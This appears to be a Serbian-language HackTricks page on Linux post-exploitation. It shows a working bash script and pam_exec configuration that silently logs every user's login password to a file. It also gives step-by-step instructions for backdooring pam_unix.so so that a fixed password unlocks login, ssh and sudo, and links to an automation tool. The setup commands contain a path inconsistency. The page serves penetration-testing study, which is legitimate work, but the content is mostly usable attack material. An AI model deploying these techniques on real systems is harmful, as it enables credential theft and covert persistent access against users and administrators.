# Linux post-eksploatacija

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Snimanje lozinki za prijavljivanje pomo캖u PAM-a

Konfiguri코imo PAM modul da bele쬴 svaku lozinku koju korisnik koristi za prijavljivanje. Ako ne znate 코ta je PAM, proverite:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**Za dodatne detalje proverite [originalni post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Ovo je samo sa쬰tak:

**Pregled tehnike:**
Pluggable Authentication Modules (PAM) pru쬬ju fleksibilnost u upravljanju autentifikacijom na Unix baziranim sistemima. Mogu pobolj코ati bezbednost prilago캠avanjem procesa prijavljivanja, ali tako캠e mogu predstavljati rizike ako se zloupotrebljavaju. Ovaj sa쬰tak opisuje tehniku za snimanje podataka za prijavljivanje pomo캖u PAM-a, zajedno sa strategijama za ubla쬬vanje rizika.

**Snimanje podataka za prijavljivanje:**
- Napravljen je bash skript nazvan `toomanysecrets.sh` koji bele쬴 poku코aje prijavljivanja, snimaju캖i datum, korisni캜ko ime (`$PAM_USER`), lozinku (putem stdin-a) i IP adresu udaljenog hosta (`$PAM_RHOST`) u `/var/log/toomanysecrets.log`.
- Skript je postavljen kao izvr코iv i integrisan u PAM konfiguraciju (`common-auth`) koriste캖i modul `pam_exec.so` sa opcijama za tiho izvr코avanje i izlaganje autentifikacionog tokena skripti.
- Ovaj pristup pokazuje kako se kompromitovan Linux host mo쬰 iskoristiti za diskretno bele쬰nje podataka za prijavljivanje.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**Za dalje detalje pogledajte [originalni post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Ovo je samo sa쬰tak:

Pluggable Authentication Module (PAM) je sistem koji se koristi pod Linuxom za autentifikaciju korisnika. Radi na tri osnovna koncepta: **korisni캜ko ime**, **lozinka** i **servis**. Konfiguracioni fajlovi za svaki servis se nalaze u direktorijumu `/etc/pam.d/`, gde se autentifikacija vr코i pomo캖u deljenih biblioteka.

**Cilj**: Modifikovati PAM kako bi se omogu캖ila autentifikacija sa odre캠enom lozinkom, zaobilaze캖i stvarnu korisni캜ku lozinku. Poseban fokus je na deljenoj biblioteci `pam_unix.so` koja se koristi u fajlu `common-auth`, a koja se uklju캜uje u skoro sve servise radi provere lozinke.

### Koraci za modifikaciju `pam_unix.so`:

1. **Locirajte direktivu za autentifikaciju** u fajlu `common-auth`:
- Linija koja proverava korisni캜ku lozinku poziva `pam_unix.so`.
2. **Modifikujte izvorni kod**:
- Dodajte uslovnu izjavu u izvorni fajl `pam_unix_auth.c` koja omogu캖ava pristup ako se koristi unapred definisana lozinka, ina캜e se nastavlja sa uobi캜ajenim procesom autentifikacije.
3. **Rekompajlirajte i zamenite** modifikovanu biblioteku `pam_unix.so` u odgovaraju캖em direktorijumu.
4. **Testiranje**:
- Pristup je omogu캖en putem razli캜itih servisa (login, ssh, sudo, su, screensaver) sa unapred definisanom lozinkom, dok uobi캜ajeni procesi autentifikacije ostaju nepromenjeni.

{% hint style="info" %}
Ovaj proces mo쬰te automatizovati pomo캖u [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
